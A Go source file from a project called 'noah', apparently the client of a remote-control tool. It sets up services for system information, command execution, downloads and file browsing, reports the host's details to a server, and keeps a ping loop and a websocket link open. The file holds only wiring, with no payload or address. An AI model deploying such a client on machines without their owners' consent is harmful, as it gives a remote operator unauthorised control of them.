package app

import (
	"context"
	"log"
	"noah/client/app/environment"
	"noah/client/app/gateway/client"
	"noah/client/app/handler"
	"noah/client/app/service"
	"noah/client/app/service/command"
	"noah/client/app/service/download"
	"noah/client/app/service/explorer"
	"noah/client/app/service/information"
	"noah/client/app/utils/network"

	"golang.org/x/sync/errgroup"
)

type App struct {
	Handler *handler.Handler
}

func New(configuration *environment.Configuration) *App {
	httpClient := network.NewHttpClient()
	clientGateway := client.NewGateway(configuration, httpClient)

	clientServices := &service.Services{
		Information:  information.NewService(),
		Command:      command.NewService(),
		Download:     download.NewService(clientGateway),
		FileExplorer: explorer.NewService(),
	}

	return &App{
		handler.NewHandler(configuration, clientGateway, clientServices),
	}
}

func (a *App) Run() {
	// 上报客户端信息
	id, err := a.Handler.SendClientSpecs()
	a.Handler.ClientID = id
	if err != nil {
		log.Fatal("error running client: ", err)
	}

	g, _ := errgroup.WithContext(context.Background())

	g.Go(func() error {
		a.Handler.Ping()
		return nil
	})

	g.Go(func() error {
		a.Handler.WebsocketConnection()
		return nil
	})

	if err := g.Wait(); err != nil {
		log.Fatal("error running client: ", err)
	}
}
